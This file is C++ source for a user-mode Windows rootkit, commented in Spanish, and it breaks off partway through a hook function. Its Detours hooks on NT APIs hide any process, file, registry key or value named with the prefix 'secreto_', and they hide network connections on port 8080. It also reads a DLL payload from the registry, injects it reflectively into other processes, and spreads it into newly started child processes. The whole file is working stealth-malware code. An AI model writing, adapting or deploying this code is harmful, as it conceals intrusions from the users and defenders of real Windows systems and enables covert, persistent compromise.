#include "pch.h"
#include "injector.h"
#include <windows.h>
#include <winternl.h>
#include <detours.h>
#include <stdlib.h>
#include <string.h>
#include <set>
#include <vector>
#include <winsvc.h>

#define MY_SIGNATURE 0x1337
#define MY_PREFIX L"secreto_"
#define HIDDEN_PORT 8080
#define HEADER_OFFSET 40
#define SL_RETURN_SINGLE_ENTRY 0x01
#define IOCTL_NSI_GETALLPARAM 0x12001B
#define STATUS_NO_MORE_FILES ((NTSTATUS)0x80000006L)

#define FileDirectoryInformation 1
#define FileFullDirectoryInformation 2
#define FileBothDirectoryInformation 3
#define FileNamesInformation 12
#define FileIdBothDirectoryInformation 37
#define FileIdFullDirectoryInformation 38


// ESTRUCTURAS NATIVAS
typedef struct _MY_SYSTEM_PROCESS_INFORMATION { ULONG NextEntryOffset; ULONG NumberOfThreads; LARGE_INTEGER Reserved1[3]; LARGE_INTEGER CreateTime; LARGE_INTEGER UserTime; LARGE_INTEGER KernelTime; UNICODE_STRING ImageName; LONG BasePriority; HANDLE UniqueProcessId; HANDLE InheritedFromUniqueProcessId; } MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;
typedef enum _KEY_INFORMATION_CLASS { KeyBasicInformation = 0, KeyNodeInformation = 1, KeyFullInformation = 2, KeyNameInformation = 3, KeyCachedInformation = 4, KeyFlagsInformation = 5 } KEY_INFORMATION_CLASS;
typedef enum _KEY_VALUE_INFORMATION_CLASS { KeyValueBasicInformation = 0, KeyValueFullInformation = 1, KeyValuePartialInformation = 2 } KEY_VALUE_INFORMATION_CLASS;
typedef struct _KEY_BASIC_INFORMATION { LARGE_INTEGER LastWriteTime; ULONG TitleIndex; ULONG NameLength; WCHAR Name[1]; } KEY_BASIC_INFORMATION, * PKEY_BASIC_INFORMATION;
typedef struct _KEY_VALUE_BASIC_INFORMATION { ULONG TitleIndex; ULONG Type; ULONG NameLength; WCHAR Name[1]; } KEY_VALUE_BASIC_INFORMATION, * PKEY_VALUE_BASIC_INFORMATION;
typedef struct _KEY_FULL_INFORMATION { LARGE_INTEGER LastWriteTime; ULONG TitleIndex; ULONG ClassOffset; ULONG ClassLength; ULONG SubKeys; ULONG MaxNameLen; ULONG MaxClassLen; ULONG Values; ULONG MaxValueNameLen; ULONG MaxValueDataLen; WCHAR Class[1]; } KEY_FULL_INFORMATION, * PKEY_FULL_INFORMATION;
typedef struct _KEY_CACHED_INFORMATION { LARGE_INTEGER LastWriteTime; ULONG TitleIndex; ULONG SubKeys; ULONG MaxNameLen; ULONG Values; ULONG MaxValueNameLen; ULONG MaxValueDataLen; ULONG NameLength; } KEY_CACHED_INFORMATION, * PKEY_CACHED_INFORMATION;
typedef enum _NSI_PARAM_TYPE { NsiTcp = 3, NsiUdp = 1 } NSI_PARAM_TYPE;
typedef struct _NSI_PROCESS_ENTRY { ULONG UdpProcessId; ULONG Unknown1; ULONG Unknown2; } NSI_PROCESS_ENTRY, * PNSI_PROCESS_ENTRY;
typedef struct _NSI_PARAM { ULONG_PTR Unknown1; SIZE_T Unknown2; PVOID Unknown3; SIZE_T Unknown4; ULONG Type; ULONG Unknown5; PVOID Entries; SIZE_T EntrySize; PVOID Unknown6; SIZE_T Unknown7; PVOID StatusEntries; SIZE_T StatusEntrySize; PVOID ProcessEntries; SIZE_T ProcessEntrySize; SIZE_T Count; } NSI_PARAM, * PNSI_PARAM;

// Estructura para leer los puertos de red
typedef struct _NSI_BASIC_ENTRY {
    USHORT Unknown;
    USHORT Port;
} NSI_BASIC_ENTRY, * PNSI_BASIC_ENTRY;

typedef struct _MY_FILE_DIRECTORY_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; LARGE_INTEGER CreationTime; LARGE_INTEGER LastAccessTime; LARGE_INTEGER LastWriteTime; LARGE_INTEGER ChangeTime; LARGE_INTEGER EndOfFile; LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; WCHAR FileName[1]; } MY_FILE_DIRECTORY_INFORMATION, * PMY_FILE_DIRECTORY_INFORMATION;
typedef struct _FILE_FULL_DIR_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; LARGE_INTEGER CreationTime; LARGE_INTEGER LastAccessTime; LARGE_INTEGER LastWriteTime; LARGE_INTEGER ChangeTime; LARGE_INTEGER EndOfFile; LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; WCHAR FileName[1]; } FILE_FULL_DIR_INFORMATION, * PFILE_FULL_DIR_INFORMATION;
typedef struct _FILE_BOTH_DIR_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; LARGE_INTEGER CreationTime; LARGE_INTEGER LastAccessTime; LARGE_INTEGER LastWriteTime; LARGE_INTEGER ChangeTime; LARGE_INTEGER EndOfFile; LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; CCHAR ShortNameLength; WCHAR ShortName[12]; WCHAR FileName[1]; } FILE_BOTH_DIR_INFORMATION, * PFILE_BOTH_DIR_INFORMATION;
typedef struct _FILE_ID_BOTH_DIR_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; LARGE_INTEGER CreationTime; LARGE_INTEGER LastAccessTime; LARGE_INTEGER LastWriteTime; LARGE_INTEGER ChangeTime; LARGE_INTEGER EndOfFile; LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; CCHAR ShortNameLength; WCHAR ShortName[12]; LARGE_INTEGER FileId; WCHAR FileName[1]; } FILE_ID_BOTH_DIR_INFORMATION, * PFILE_ID_BOTH_DIR_INFORMATION;
typedef struct _FILE_NAMES_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; ULONG FileNameLength; WCHAR FileName[1]; } FILE_NAMES_INFORMATION, * PFILE_NAMES_INFORMATION;
typedef struct _FILE_ID_FULL_DIR_INFORMATION { ULONG NextEntryOffset; ULONG FileIndex; LARGE_INTEGER CreationTime; LARGE_INTEGER LastAccessTime; LARGE_INTEGER LastWriteTime; LARGE_INTEGER ChangeTime; LARGE_INTEGER EndOfFile; LARGE_INTEGER AllocationSize; ULONG FileAttributes; ULONG FileNameLength; ULONG EaSize; LARGE_INTEGER FileId; WCHAR FileName[1]; } FILE_ID_FULL_DIR_INFORMATION, * PFILE_ID_FULL_DIR_INFORMATION;


// PROTOTIPOS
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtQueryDirectoryFile)(HANDLE, HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG, int, BOOLEAN, PVOID, BOOLEAN);
typedef NTSTATUS(NTAPI* pNtQueryDirectoryFileEx)(HANDLE, HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG, int, ULONG, PVOID);
typedef NTSTATUS(NTAPI* pNtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtEnumerateValueKey)(HANDLE, ULONG, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtQueryKey)(HANDLE, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtDeviceIoControlFile)(HANDLE, HANDLE, PVOID, PVOID, PVOID, ULONG, PVOID, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtResumeThread)(HANDLE, PULONG);
typedef BOOL(WINAPI* pEnumServicesStatusExW)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCWSTR);

pEnumServicesStatusExW OriginalEnumServicesStatusExW = nullptr;
pEnumServicesStatusExW OriginalEnumServicesStatusExW2 = nullptr;
pNtResumeThread OriginalNtResumeThread = nullptr;
pNtDeviceIoControlFile OriginalNtDeviceIoControlFile = nullptr;
pNtQueryKey OriginalNtQueryKey = nullptr;
pNtEnumerateKey OriginalNtEnumerateKey = nullptr;
pNtEnumerateValueKey OriginalNtEnumerateValueKey = nullptr;
pNtQuerySystemInformation OriginalNtQuerySystem = nullptr;
pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = nullptr;
pNtQueryDirectoryFileEx OriginalNtQueryDirectoryFileEx = nullptr;


// CACHÉ TLS NATIVA
DWORD TlsKeyNode_Key;
DWORD TlsKeyNode_Index;
DWORD TlsKeyNode_I;
DWORD TlsKeyNode_CorrectedIndex;

DWORD TlsKeyValue_Key;
DWORD TlsKeyValue_Index;
DWORD TlsKeyValue_I;
DWORD TlsKeyValue_CorrectedIndex;



// FUNCIONES HELPER
std::set<DWORD> PIDsHijosInyectados;
std::vector<BYTE> PayloadCacheados;
#ifdef _WIN64
std::vector<BYTE> PayloadCacheados_x86;
#endif

static std::vector<BYTE> CargarPayloadDeRegistro(const WCHAR* nombreValor) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
        return {};
    DWORD dataSize = 0;
    if (RegQueryValueExW(hKey, nombreValor, nullptr, nullptr, nullptr, &dataSize) != ERROR_SUCCESS || dataSize == 0) {
        RegCloseKey(hKey);
        return {};
    }
    std::vector<BYTE> data(dataSize);
    RegQueryValueExW(hKey, nombreValor, nullptr, nullptr, data.data(), &dataSize);
    RegCloseKey(hKey);
    return data;
}

#ifdef _WIN64
static int GetReflectiveLoaderOffset_x86(const std::vector<BYTE>& dll) {
    if (dll.size() < 0x40) return 0;
    const BYTE* data = dll.data();
    int e_lfanew = *(int*)(data + 0x3C);
    if (e_lfanew <= 0 || (size_t)(e_lfanew + sizeof(IMAGE_NT_HEADERS32)) > dll.size()) return 0;
    auto* nt = (IMAGE_NT_HEADERS32*)(data + e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    int secCount  = nt->FileHeader.NumberOfSections;
    int secOffset = e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt->FileHeader.SizeOfOptionalHeader;

    auto rvaToOff = [&](int rva) -> int {
        auto* sec = (IMAGE_SECTION_HEADER*)(data + secOffset);
        for (int i = 0; i < secCount; i++, sec++) {
            if (rva >= (int)sec->VirtualAddress && rva < (int)(sec->VirtualAddress + sec->Misc.VirtualSize))
                return rva - (int)sec->VirtualAddress + (int)sec->PointerToRawData;
        }
        return 0;
    };

    int exportRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRVA) return 0;
    int exportOff = rvaToOff(exportRVA);
    if (!exportOff) return 0;
    auto* expDir = (IMAGE_EXPORT_DIRECTORY*)(data + exportOff);

    int namesOff = rvaToOff(expDir->AddressOfNames);
    int ordsOff  = rvaToOff(expDir->AddressOfNameOrdinals);
    int funcsOff = rvaToOff(expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        int nameRVA = *(DWORD*)(data + namesOff + i * 4);
        int nameOff = rvaToOff(nameRVA);
        if (!nameOff) continue;
        if (strcmp((const char*)data + nameOff, "ReflectiveLoader") == 0) {
            WORD  ord    = *(WORD*)(data + ordsOff + i * 2);
            int funcRVA  = *(DWORD*)(data + funcsOff + ord * 4);
            return rvaToOff(funcRVA);
        }
    }
    return 0;
}

static bool InjectReflective_x86(HANDLE hProc, const std::vector<BYTE>& dllBytes) {
    if (dllBytes.empty()) return false;
    int loaderOffset = GetReflectiveLoaderOffset_x86(dllBytes);
    if (!loaderOffset) return false;

    LPVOID baseAddr = VirtualAllocEx(hProc, nullptr, dllBytes.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!baseAddr) return false;

    if (!WriteProcessMemory(hProc, baseAddr, dllBytes.data(), dllBytes.size(), nullptr)) {
        VirtualFreeEx(hProc, baseAddr, 0, MEM_RELEASE);
        return false;
    }

    LPTHREAD_START_ROUTINE loaderAddr = (LPTHREAD_START_ROUTINE)((BYTE*)baseAddr + loaderOffset);
    HANDLE hThread = CreateRemoteThread(hProc, nullptr, 0, loaderAddr, baseAddr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProc, baseAddr, 0, MEM_RELEASE);
        return false;
    }
    CloseHandle(hThread);
    return true;
}
#endif

bool IsHidden(const WCHAR* nameBytes, ULONG nameLengthBytes) {
    if (!nameBytes || nameLengthBytes == 0) return false;
    const WCHAR* prefix = MY_PREFIX;
    ULONG prefixLen = wcslen(prefix);
    ULONG nameLenChars = nameLengthBytes / sizeof(WCHAR);

    if (nameLenChars < prefixLen) return false;

    for (ULONG i = 0; i < prefixLen; i++) {
        WCHAR c1 = nameBytes[i];
        WCHAR c2 = prefix[i];
        if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
        if (c2 >= L'A' && c2 <= L'Z') c2 += 32;
        if (c1 != c2) return false;
    }
    return true;
}

PWCHAR ObtenerNombreArchivo(PVOID fileInfo, int fileInfoClass, ULONG* longitudNombreBytes) {
    switch (fileInfoClass) {
    case FileDirectoryInformation: *longitudNombreBytes = ((PMY_FILE_DIRECTORY_INFORMATION)fileInfo)->FileNameLength; return ((PMY_FILE_DIRECTORY_INFORMATION)fileInfo)->FileName;
    case FileFullDirectoryInformation: *longitudNombreBytes = ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileNameLength; return ((PFILE_FULL_DIR_INFORMATION)fileInfo)->FileName;
    case FileBothDirectoryInformation: *longitudNombreBytes = ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength; return ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->FileName;
    case FileNamesInformation: *longitudNombreBytes = ((PFILE_NAMES_INFORMATION)fileInfo)->FileNameLength; return ((PFILE_NAMES_INFORMATION)fileInfo)->FileName;
    case FileIdBothDirectoryInformation: *longitudNombreBytes = ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileNameLength; return ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->FileName;
    case FileIdFullDirectoryInformation: *longitudNombreBytes = ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileNameLength; return ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->FileName;
    default: *longitudNombreBytes = 0; return nullptr;
    }
}

ULONG ObtenerNextEntryOffset(PVOID fileInfo, int fileInfoClass) {
    switch (fileInfoClass) {
    case FileDirectoryInformation: return ((PMY_FILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset;
    case FileFullDirectoryInformation: return ((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
    case FileBothDirectoryInformation: return ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
    case FileNamesInformation: return ((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset;
    case FileIdBothDirectoryInformation: return ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
    case FileIdFullDirectoryInformation: return ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
    default: return 0;
    }
}

void SetNextEntryOffset(PVOID fileInfo, int fileInfoClass, ULONG value) {
    switch (fileInfoClass) {
    case FileDirectoryInformation: ((PMY_FILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    case FileFullDirectoryInformation: ((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    case FileBothDirectoryInformation: ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    case FileNamesInformation: ((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    case FileIdBothDirectoryInformation: ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    case FileIdFullDirectoryInformation: ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = value; break;
    }
}

bool EsProcesoOcultoPorPID(DWORD pid) {
    if (pid == 0 || pid == 4) return false;
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (hProc) {
        WCHAR path[MAX_PATH];
        DWORD size = MAX_PATH;
        if (QueryFullProcessImageNameW(hProc, 0, path, &size)) {
            WCHAR* exeName = wcsrchr(path, L'\\');
            if (exeName) {
                exeName++;
                ULONG nameLen = wcslen(exeName) * sizeof(WCHAR);
                if (IsHidden(exeName, nameLen)) {
                    CloseHandle(hProc);
                    return true;
                }
            }
        }
        CloseHandle(hProc);
    }
    return false;
}


// API HOOKS INTERCEPTADOS 

NTSTATUS NTAPI HookedNtQuerySystemInformation(ULONG Class, PVOID Info, ULONG Len, PULONG RetLen) {
    NTSTATUS status = OriginalNtQuerySystem(Class, Info, Len, RetLen);

    if (NT_SUCCESS(status) && (Class == 5 || Class == 57)) {
        PMY_SYSTEM_PROCESS_INFORMATION pCurrent = (PMY_SYSTEM_PROCESS_INFORMATION)Info;
        PMY_SYSTEM_PROCESS_INFORMATION pPrev = NULL;

        while (pCurrent) {
            bool isHidden = false;
            if (pCurrent->ImageName.Buffer != NULL) {
                if (IsHidden(pCurrent->ImageName.Buffer, pCurrent->ImageName.Length)) isHidden = true;
            }

            if (isHidden) {
                if (pPrev) {
                    if (pCurrent->NextEntryOffset) pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                    else pPrev->NextEntryOffset = 0;
                }
                else {
                    if (pCurrent->NextEntryOffset) Info = (LPBYTE)Info + pCurrent->NextEntryOffset;
                    else Info = NULL;
                }
            }
            else pPrev = pCurrent;

            if (pCurrent->NextEntryOffset) pCurrent = (PMY_SYSTEM_PROCESS_INFORMATION)((LPBYTE)pCurrent + pCurrent->NextEntryOffset);
            else pCurrent = NULL;
        }
    }
    return status;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFile(HANDLE h, HANDLE e, PVOID a, PVOID ac, PVOID io, PVOID fi, ULONG l, int c, BOOLEAN s, PVOID fn, BOOLEAN r) {
    NTSTATUS status = OriginalNtQueryDirectoryFile(h, e, a, ac, io, fi, l, c, s, fn, r);

    if (NT_SUCCESS(status) && fi && io) {
        PIO_STATUS_BLOCK ioBlock = (PIO_STATUS_BLOCK)io;
        if (s) {
            ULONG lenBytes = 0;
            PWCHAR pName = ObtenerNombreArchivo(fi, c, &lenBytes);
            while (pName && IsHidden(pName, lenBytes)) {
                status = OriginalNtQueryDirectoryFile(h, e, a, ac, io, fi, l, c, s, fn, FALSE);
                if (!NT_SUCCESS(status)) break;
                pName = ObtenerNombreArchivo(fi, c, &lenBytes);
            }
        }
        else {
            PBYTE current = (PBYTE)fi;
            PBYTE previous = NULL;
            ULONG nextEntryOffset;
            ULONG validLength = (ULONG)ioBlock->Information;

            do {
                nextEntryOffset = ObtenerNextEntryOffset(current, c);
                ULONG lenBytes = 0;
                PWCHAR pName = ObtenerNombreArchivo(current, c, &lenBytes);

                if (IsHidden(pName, lenBytes)) {
                    if (nextEntryOffset) {
                        memmove(current, current + nextEntryOffset, validLength - (ULONG)(current - (PBYTE)fi) - nextEntryOffset);
                        validLength -= nextEntryOffset;
                        continue;
                    }
                    else {
                        if (current == fi) status = STATUS_NO_MORE_FILES;
                        else {
                            SetNextEntryOffset(previous, c, 0);
                            validLength -= (ULONG)(current - previous);
                        }
                        break;
                    }
                }
                previous = current;
                current += nextEntryOffset;
            } while (nextEntryOffset);

            ioBlock->Information = validLength;
        }
    }
    return status;
}

NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE h, HANDLE e, PVOID a, PVOID ac, PVOID io, PVOID fi, ULONG l, int c, ULONG qf, PVOID fn) {
    NTSTATUS status = OriginalNtQueryDirectoryFileEx(h, e, a, ac, io, fi, l, c, qf, fn);

    if (NT_SUCCESS(status) && fi && io) {
        PIO_STATUS_BLOCK ioBlock = (PIO_STATUS_BLOCK)io;
        if (qf & SL_RETURN_SINGLE_ENTRY) {
            ULONG lenBytes = 0;
            PWCHAR pName = ObtenerNombreArchivo(fi, c, &lenBytes);
            while (pName && IsHidden(pName, lenBytes)) {
                ULONG modifiedQf = qf & ~0x02;
                status = OriginalNtQueryDirectoryFileEx(h, e, a, ac, io, fi, l, c, modifiedQf, fn);
                if (!NT_SUCCESS(status)) break;
                pName = ObtenerNombreArchivo(fi, c, &lenBytes);
            }
        }
        else {
            PBYTE current = (PBYTE)fi;
            PBYTE previous = NULL;
            ULONG nextEntryOffset;
            ULONG validLength = (ULONG)ioBlock->Information;

            do {
                nextEntryOffset = ObtenerNextEntryOffset(current, c);
                ULONG lenBytes = 0;
                PWCHAR pName = ObtenerNombreArchivo(current, c, &lenBytes);

                if (IsHidden(pName, lenBytes)) {
                    if (nextEntryOffset) {
                        memmove(current, current + nextEntryOffset, validLength - (ULONG)(current - (PBYTE)fi) - nextEntryOffset);
                        validLength -= nextEntryOffset;
                        continue;
                    }
                    else {
                        if (current == fi) status = STATUS_NO_MORE_FILES;
                        else {
                            SetNextEntryOffset(previous, c, 0);
                            validLength -= (ULONG)(current - previous);
                        }
                        break;
                    }
                }
                previous = current;
                current += nextEntryOffset;
            } while (nextEntryOffset);

            ioBlock->Information = validLength;
        }
    }
    return status;
}

NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG keyInformationLength, PULONG resultLength) {
    if (keyInformationClass == KeyNodeInformation) {
        return OriginalNtEnumerateKey(key, index, keyInformationClass, keyInformation, keyInformationLength, resultLength);
    }

    HANDLE cacheKey = (HANDLE)TlsGetValue(TlsKeyNode_Key);
    ULONG cacheIndex = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyNode_Index);
    ULONG cacheI = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyNode_I);
    ULONG cacheCorrectedIndex = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyNode_CorrectedIndex);

    ULONG i = 0;
    ULONG correctedIndex = 0;

    if (cacheKey == key && cacheIndex == index - 1) {
        i = cacheI;
        correctedIndex = cacheCorrectedIndex + 1;
    }

    BYTE buffer[2048];
    PKEY_BASIC_INFORMATION basicInfo = (PKEY_BASIC_INFORMATION)buffer;
    ULONG resLen = 0;

    for (; i <= index; correctedIndex++) {
        NTSTATUS status = OriginalNtEnumerateKey(key, correctedIndex, KeyBasicInformation, basicInfo, 2048, &resLen);
        if (!NT_SUCCESS(status)) return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);

        if (!IsHidden(basicInfo->Name, basicInfo->NameLength)) i++;
    }

    correctedIndex--;

    TlsSetValue(TlsKeyNode_Key, key);
    TlsSetValue(TlsKeyNode_Index, (LPVOID)(ULONG_PTR)index);
    TlsSetValue(TlsKeyNode_I, (LPVOID)(ULONG_PTR)i);
    TlsSetValue(TlsKeyNode_CorrectedIndex, (LPVOID)(ULONG_PTR)correctedIndex);

    return OriginalNtEnumerateKey(key, correctedIndex, keyInformationClass, keyInformation, keyInformationLength, resultLength);
}

NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength) {
    HANDLE cacheKey = (HANDLE)TlsGetValue(TlsKeyValue_Key);
    ULONG cacheIndex = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyValue_Index);
    ULONG cacheI = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyValue_I);
    ULONG cacheCorrectedIndex = (ULONG)(ULONG_PTR)TlsGetValue(TlsKeyValue_CorrectedIndex);

    ULONG i = 0;
    ULONG correctedIndex = 0;

    if (cacheKey == key && cacheIndex == index - 1) {
        i = cacheI;
        correctedIndex = cacheCorrectedIndex + 1;
    }

    BYTE buffer[2048];
    PKEY_VALUE_BASIC_INFORMATION basicInfo = (PKEY_VALUE_BASIC_INFORMATION)buffer;
    ULONG resLen = 0;

    for (; i <= index; correctedIndex++) {
        NTSTATUS status = OriginalNtEnumerateValueKey(key, correctedIndex, KeyValueBasicInformation, basicInfo, 2048, &resLen);
        if (!NT_SUCCESS(status)) return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

        if (!IsHidden(basicInfo->Name, basicInfo->NameLength)) i++;
    }

    correctedIndex--;

    TlsSetValue(TlsKeyValue_Key, key);
    TlsSetValue(TlsKeyValue_Index, (LPVOID)(ULONG_PTR)index);
    TlsSetValue(TlsKeyValue_I, (LPVOID)(ULONG_PTR)i);
    TlsSetValue(TlsKeyValue_CorrectedIndex, (LPVOID)(ULONG_PTR)correctedIndex);

    return OriginalNtEnumerateValueKey(key, correctedIndex, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
}

NTSTATUS NTAPI HookedNtQueryKey(HANDLE key, KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG length, PULONG resultLength) {
    NTSTATUS status = OriginalNtQueryKey(key, keyInformationClass, keyInformation, length, resultLength);

    if (NT_SUCCESS(status) && (keyInformationClass == KeyFullInformation || keyInformationClass == KeyCachedInformation)) {
        BYTE buffer[2048];
        PKEY_BASIC_INFORMATION keyBasicInformation = (PKEY_BASIC_INFORMATION)buffer;
        PKEY_VALUE_BASIC_INFORMATION keyValueBasicInformation = (PKEY_VALUE_BASIC_INFORMATION)buffer;

        ULONG hiddenSubKeys = 0;
        ULONG hiddenValues = 0;
        ULONG dummyResLen = 0;

        for (ULONG i = 0; OriginalNtEnumerateKey(key, i, KeyBasicInformation, keyBasicInformation, 2048, &dummyResLen) == 0; i++) {
            if (IsHidden(keyBasicInformation->Name, keyBasicInformation->NameLength)) hiddenSubKeys++;
        }

        for (ULONG i = 0; OriginalNtEnumerateValueKey(key, i, KeyValueBasicInformation, keyValueBasicInformation, 2048, &dummyResLen) == 0; i++) {
            if (IsHidden(keyValueBasicInformation->Name, keyValueBasicInformation->NameLength)) hiddenValues++;
        }

        if (keyInformationClass == KeyFullInformation) {
            ((PKEY_FULL_INFORMATION)keyInformation)->SubKeys -= hiddenSubKeys;
            ((PKEY_FULL_INFORMATION)keyInformation)->Values -= hiddenValues;
        }
        else if (keyInformationClass == KeyCachedInformation) {
            ((PKEY_CACHED_INFORMATION)keyInformation)->SubKeys -= hiddenSubKeys;
            ((PKEY_CACHED_INFORMATION)keyInformation)->Values -= hiddenValues;
        }
    }
    return status;
}

NTSTATUS NTAPI HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PVOID apcRoutine, PVOID apcContext, PVOID ioStatusBlock, ULONG ioControlCode, PVOID inputBuffer, ULONG inputBufferLength, PVOID outputBuffer, ULONG outputBufferLength) {

    NTSTATUS status = OriginalNtDeviceIoControlFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, ioControlCode, inputBuffer, inputBufferLength, outputBuffer, outputBufferLength);

    if (NT_SUCCESS(status) && ioControlCode == IOCTL_NSI_GETALLPARAM && outputBuffer) {
        PNSI_PARAM nsiParam = (PNSI_PARAM)outputBuffer;

        if (nsiParam->Entries && (nsiParam->Type == NsiTcp || nsiParam->Type == NsiUdp)) {
            for (SIZE_T i = 0; i < nsiParam->Count; i++) {
                bool isHidden = false;

                if (nsiParam->Entries) {
                    PNSI_BASIC_ENTRY entry = (PNSI_BASIC_ENTRY)((LPBYTE)nsiParam->Entries + (i * nsiParam->EntrySize));
                    USHORT port = _byteswap_ushort(entry->Port);
                    if (port == HIDDEN_PORT) {
                        isHidden = true;
                    }
                }

                if (!isHidden && nsiParam->ProcessEntries) {
                    PNSI_PROCESS_ENTRY processEntry = (PNSI_PROCESS_ENTRY)((LPBYTE)nsiParam->ProcessEntries + (i * nsiParam->ProcessEntrySize));
                    DWORD pid = processEntry->UdpProcessId;
                    if (EsProcesoOcultoPorPID(pid)) {
                        isHidden = true;
                    }
                }

                if (isHidden) {
                    if (nsiParam->Entries && i < nsiParam->Count - 1) {
                        memmove((LPBYTE)nsiParam->Entries + (i * nsiParam->EntrySize),
                            (LPBYTE)nsiParam->Entries + ((i + 1) * nsiParam->EntrySize),
                            (nsiParam->Count - i - 1) * nsiParam->EntrySize);
                    }
                    if (nsiParam->StatusEntries && i < nsiParam->Count - 1) {
                        memmove((LPBYTE)nsiParam->StatusEntries + (i * nsiParam->StatusEntrySize),
                            (LPBYTE)nsiParam->StatusEntries + ((i + 1) * nsiParam->StatusEntrySize),
                            (nsiParam->Count - i - 1) * nsiParam->StatusEntrySize);
                    }
                    if (nsiParam->ProcessEntries && i < nsiParam->Count - 1) {
                        memmove((LPBYTE)nsiParam->ProcessEntries + (i * nsiParam->ProcessEntrySize),
                            (LPBYTE)nsiParam->ProcessEntries + ((i + 1) * nsiParam->ProcessEntrySize),
                            (nsiParam->Count - i - 1) * nsiParam->ProcessEntrySize);
                    }

                    nsiParam->Count--;
                    i--;
                }
            }
        }
    }
    return status;
}

NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount) {
    DWORD processId = GetProcessIdOfThread(thread);
    DWORD currentProcessId = GetCurrentProcessId();

    if (processId != 0 && processId != currentProcessId) {
        if (PIDsHijosInyectados.find(processId) == PIDsHijosInyectados.end()) {
            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
            if (hProc) {
                BOOL isWow64 = FALSE;
                IsWow64Process(hProc, &isWow64);

#ifdef _WIN64
                if (!isWow64 && !PayloadCacheados.empty()) {
                    ManualMap(hProc, PayloadCacheados);
                } else if (isWow64 && !PayloadCacheados_x86.empty()) {
